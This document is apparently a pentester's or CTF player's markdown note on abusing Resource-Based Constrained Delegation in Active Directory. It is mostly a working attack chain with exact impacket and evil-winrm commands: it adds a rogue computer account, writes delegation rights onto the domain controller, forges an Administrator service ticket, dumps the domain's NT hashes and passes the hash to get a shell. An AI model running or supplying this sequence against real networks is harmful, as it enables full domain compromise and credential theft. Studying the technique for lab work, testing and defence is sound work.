# RBCD — Resource-Based Constrained Delegation

Classic [[Constrained-Delegation]] is configured *on the account doing the impersonating*, and only an admin can set it — so to abuse it you first have to become that account. Resource-Based Constrained Delegation turns the direction around: the permission lives *on the target*, in its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which lists the accounts allowed to impersonate users *to that target*. That attribute is an ordinary writable property, so anyone holding a write right over the target object — an [[Security-Terms#^ace|ACE]] such as `GenericWrite`, `GenericAll`, `WriteDacl`, `WriteOwner`/`Owns`, or `AllowedToAct` itself — can set it. The foothold is not a cracked service account; it is a single write permission, and [[BloodHound]] is what surfaces it as an edge into a computer — the domain controller included.

The move, end to end: create a computer account whose password you know, write that account into the target's delegation list, then ask the [[Security-Terms#^kdc|KDC]] for a [[Security-Terms#^service-ticket|service ticket]] impersonating anyone you like (the S4U — Service for User — exchange `getST` runs for you). A ticket to `cifs/<dc>` as the Administrator is [[DCSync]] and the whole domain.

> [!note] What this note assumes
> [[BloodHound]] (or an ACL read) shows your user, or a group it is in, with a write edge onto a **computer** object — most valuably `DC01` itself. A `constrained` flag on some *other* account (a [[Kerberoasting|roastable]] service account) is a different, often dead-end lead — see [[Constrained-Delegation]]. This note is the one that pays when the edge lands on the target.

## Prerequisite — can you add a computer?

```bash
nxc ldap <dc ip> -u '<user>' -p '<password>' -M maq
```

- `-M maq` → reads **MachineAccountQuota** (MAQ), the number of computer accounts one ordinary user may create. Default `10`.
- `MachineAccountQuota: 0` → you cannot add one, and RBCD needs a machine account whose password you set. Fall back to a computer account you already control, or another path.

## 1 — Create a computer you control

```bash
impacket-addcomputer -computer-name 'ATK$' -computer-pass 'Atk1234!' -dc-host DC01.corp.local -domain-netbios corp.local 'corp.local/<user>:<password>'
```

- `-computer-name 'ATK$'` → the new account's name; the trailing `$` is mandatory for a machine account, and the single quotes keep the shell off the `$`.
- `-computer-pass` → a password you choose, because step 3 forges tickets *as* this account and needs its secret.
- the credential at the end is your write-ACL user. Native PowerShell `New-ADComputer` from a low-privileged session often fails here (`modification not permitted`, `required attribute missing`); `impacket-addcomputer` builds the request over a different path and succeeds where the cmdlet refuses — reach for it rather than concluding the attack failed.

## 2 — Write the delegation

```bash
impacket-rbcd -delegate-from 'ATK$' -delegate-to 'DC01$' -action write 'corp.local/<user>:<password>'
```

- `-delegate-from 'ATK$'` → the account to be trusted (yours). `-delegate-to 'DC01$'` → the target the right is written onto (the DC). Swap the two and you write the right onto your own machine, which grants nothing.
- the credential at the end is the one holding the write ACL, not the computer account.
- `Delegation rights modified successfully!` → the DC now trusts `ATK$` to impersonate users to it via S4U2Proxy.

## 3 — Forge a ticket as any user

```bash
impacket-getST -spn 'cifs/DC01.corp.local' -impersonate 'Administrator' 'corp.local/ATK$:Atk1234!'
```

- `-spn 'cifs/DC01.corp.local'` → the service the ticket is for. CIFS (Common Internet File System) is the Windows file/admin service, and [[DCSync]]'s `secretsdump` speaks it. The host part must be the [[Security-Terms#^fqdn|FQDN]], never the IP.
- `-impersonate 'Administrator'` → the user you become.
- the credential here is the **computer account** from step 1, not your user.
- writes a ccache file; its exact name is on the `Saving ticket in ...` line. A leading `CCache file is not found. Skipping...` is not an error — the tool looked for an existing ticket, found none, and carried on.

## 4 — Spend the ticket

```bash
export KRB5CCNAME=Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache
```

- point [[Security-Terms#^krb5ccname|KRB5CCNAME]] at the file step 3 wrote. Forget it and the next tool falls back to asking for a password you do not have. A *stale* value left from an earlier box makes a tool fail with `No such file ... .ccache` — `unset KRB5CCNAME` and redo this.

```bash
impacket-secretsdump -k -no-pass corp.local/Administrator@DC01.corp.local
```

- `-k` → authenticate with the ticket in `KRB5CCNAME`. `-no-pass` → do not prompt for a password.
- `Administrator:500:<lm>:<nt>:::` → the fourth field is the [[Security-Terms#^nt-hash|NT hash]]; no cracking needed, [[Security-Terms#^pass-the-hash|pass it]]:

```bash
evil-winrm -i <dc ip> -u Administrator -H <nt hash>
```

This is [[DCSync]] reached by another road: step 3 forges a ticket good enough to replicate, step 4 is the pull. Back to [[▸ AD-Run-Sheet]] step 5 to spot the write edge in the first place.
